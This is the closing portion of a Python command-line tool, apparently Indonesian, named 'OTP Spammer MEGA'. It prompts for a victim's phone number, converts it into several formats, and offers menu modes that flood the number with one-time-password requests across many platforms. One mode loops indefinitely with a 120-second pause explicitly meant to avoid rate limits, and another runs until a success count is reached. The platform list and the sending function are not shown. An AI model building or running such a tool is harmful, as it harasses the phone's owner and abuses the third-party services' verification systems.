    print(f"{Color.MAGENTA}└────────────────────────────────────────────────────────────┘{Color.RESET}")
    
    return success_count

# ============================================================
# MENU UTAMA
# ============================================================
def main():
    banner()
    
    print(f"{Color.MAGENTA}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
    print(f"{Color.MAGENTA}│  {Color.BOLD}{Color.WHITE}📱 OTP Spammer MEGA{Color.RESET}  {Color.DIM}• {len(PLATFORMS)} Platform • by MONZ{Color.MAGENTA}  │{Color.RESET}")
    print(f"{Color.MAGENTA}└────────────────────────────────────────────────────────────┘{Color.RESET}")
    
    phone = input(f"\n{Color.CYAN}┌─ {Color.BOLD}📞 Nomor HP{Color.RESET}\n{Color.CYAN}└──➤ {Color.RESET}").strip()
    
    if not phone:
        print(f"{Color.RED}┌─ [!] Nomor kosong!{Color.RESET}")
        print(f"{Color.RED}└────────────────────────────────────────────────────────────{Color.RESET}")
        return
    
    phone_08 = normalize_phone(phone)
    phone_62 = to_62(phone_08)
    phone_plus = to_plus(phone_08)
    phone_nocode = to_nocode(phone_08)
    phone_int = int(phone_62)
    
    print(f"\n{Color.GREEN}┌─ {Color.BOLD}✅ Target{Color.RESET}")
    print(f"{Color.GREEN}│  📱 08  → {phone_08}{Color.RESET}")
    print(f"{Color.GREEN}│  📱 62  → {phone_62}{Color.RESET}")
    print(f"{Color.GREEN}│  📱 +   → {phone_plus}{Color.RESET}")
    print(f"{Color.GREEN}│  📱 No  → {phone_nocode}{Color.RESET}")
    print(f"{Color.GREEN}└────────────────────────────────────────────────────────────{Color.RESET}")
    
    print(f"\n{Color.MAGENTA}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
    print(f"{Color.MAGENTA}│  {Color.BOLD}{Color.WHITE}🎯 MENU{Color.RESET}{Color.MAGENTA}                                                 │{Color.RESET}")
    print(f"{Color.MAGENTA}├────────────────────────────────────────────────────────────┤{Color.RESET}")
    print(f"{Color.MAGENTA}│  {Color.GREEN}1.{Color.RESET}  🚀 SPAM PARALLEL       {Color.DIM}→ Semua platform{Color.MAGENTA}                 │{Color.RESET}")
    print(f"{Color.MAGENTA}│  {Color.GREEN}2.{Color.RESET}  🔄 SPAM LOOP           {Color.DIM}→ Terus menerus (jeda 120s){Color.MAGENTA}      │{Color.RESET}")
    print(f"{Color.MAGENTA}│  {Color.GREEN}3.{Color.RESET}  🛑 SPAM + AUTO STOP    {Color.DIM}→ Stop 5+ sukses{Color.MAGENTA}                │{Color.RESET}")
    print(f"{Color.MAGENTA}│  {Color.GREEN}4.{Color.RESET}  📋 LIST PLATFORM       {Color.DIM}→ Lihat semua{Color.MAGENTA}                    │{Color.RESET}")
    print(f"{Color.MAGENTA}│  {Color.GREEN}5.{Color.RESET}  ❌ EXIT                {Color.DIM}→ Keluar{Color.MAGENTA}                         │{Color.RESET}")
    print(f"{Color.MAGENTA}└────────────────────────────────────────────────────────────┘{Color.RESET}")
    
    mode = input(f"\n{Color.CYAN}┌─ {Color.BOLD}🔹 Pilih (1-5){Color.RESET}\n{Color.CYAN}└──➤ {Color.RESET}").strip()
    
    if mode == "1":
        spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int)
    
    elif mode == "2":
        print(f"\n{Color.YELLOW}┌─ {Color.BOLD}🔄 LOOP MODE (JEDA 120 DETIK){Color.RESET}")
        print(f"{Color.YELLOW}│  Tekan {Color.RED}Ctrl+C{Color.YELLOW} untuk berhenti{Color.RESET}")
        print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
        try:
            round_num = 0
            while True:
                round_num += 1
                print(f"\n{Color.CYAN}┌─ {Color.BOLD}📌 ROUND {round_num}{Color.RESET}")
                print(f"{Color.CYAN}└────────────────────────────────────────────────────────────{Color.RESET}")
                spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int)
                print(f"\n{Color.YELLOW}⏳ Jeda 120 detik... (biar gak kena rate limit){Color.RESET}")
                for i in range(120, 0, -1):
                    print(f"\r  {Color.YELLOW}⏳ {i:>3} detik...{Color.RESET}", end="")
                    time.sleep(1)
                print()
        except KeyboardInterrupt:
            print(f"\n{Color.YELLOW}┌─ [!] Dihentikan{Color.RESET}")
            print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
            sys.exit(0)
    
    elif mode == "3":
        target = 5
        print(f"\n{Color.YELLOW}┌─ {Color.BOLD}🛑 AUTO STOP{Color.RESET}")
        print(f"{Color.YELLOW}│  Stop setelah {Color.GREEN}{target}{Color.YELLOW} sukses{Color.RESET}")
        print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
        
        total = 0
        round_num = 0
        
        try:
            while total < target:
                round_num += 1
                print(f"\n{Color.CYAN}┌─ {Color.BOLD}📌 ROUND {round_num}{Color.RESET}  {Color.DIM}• {total}/{target}{Color.RESET}")
                print(f"{Color.CYAN}└────────────────────────────────────────────────────────────{Color.RESET}")
                success = spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int)
                total += success
                
                if total >= target:
                    print(f"\n{Color.GREEN}┌─ {Color.BOLD}✅ TARGET TERCAPAI!{Color.RESET}")
                    print(f"{Color.GREEN}│  Total sukses: {total}{Color.RESET}")
                    print(f"{Color.GREEN}└────────────────────────────────────────────────────────────{Color.RESET}")
                    break
                
                print(f"\n{Color.YELLOW}⏳ Jeda 60 detik...{Color.RESET}")
                for i in range(60, 0, -1):
                    print(f"\r  {Color.YELLOW}⏳ {i:>3} detik...{Color.RESET}", end="")
                    time.sleep(1)
                print()
        except KeyboardInterrupt:
            print(f"\n{Color.YELLOW}┌─ [!] Dihentikan{Color.RESET}")
            print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
            sys.exit(0)
    
    elif mode == "4":
        print(f"\n{Color.MAGENTA}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
        print(f"{Color.MAGENTA}│  {Color.BOLD}{Color.WHITE}📋 LIST PLATFORM ({len(PLATFORMS)}){Color.RESET}{Color.MAGENTA}                          │{Color.RESET}")
        print(f"{Color.MAGENTA}├────────────────────────────────────────────────────────────┤{Color.RESET}")
        for i, (name, _, fmt) in enumerate(PLATFORMS, 1):
            icon = "📱" if fmt == "08" else "🌐" if fmt == "62" else "📞" if fmt == "plus" else "🔢"
            print(f"{Color.MAGENTA}│  {Color.GREEN}{i:>2}.{Color.RESET} {name:<16}  {icon} {fmt}{Color.MAGENTA}                             │{Color.RESET}")
        print(f"{Color.MAGENTA}└────────────────────────────────────────────────────────────┘{Color.RESET}")
        input(f"\n{Color.DIM}Enter untuk kembali...{Color.RESET}")
    
    elif mode == "5":
        print(f"\n{Color.YELLOW}┌─ [!] Keluar{Color.RESET}")
        print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
        sys.exit(0)
    
    else:
        print(f"{Color.RED}┌─ [!] Pilihan tidak valid!{Color.RESET}")
        print(f"{Color.RED}└────────────────────────────────────────────────────────────{Color.RESET}")
    
    print()
    input(f"{Color.DIM}Enter untuk kembali...{Color.RESET}")

# ============================================================
# RUN
# ============================================================
if __name__ == "__main__":
    try:
        while True:
            main()
    except KeyboardInterrupt:
        print(f"\n{Color.YELLOW}┌─ [!] Dihentikan{Color.RESET}")
        print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Color.RED}┌─ [!] Error: {e}{Color.RESET}")
        print(f"{Color.RED}└────────────────────────────────────────────────────────────{Color.RESET}")
        sys.exit(1)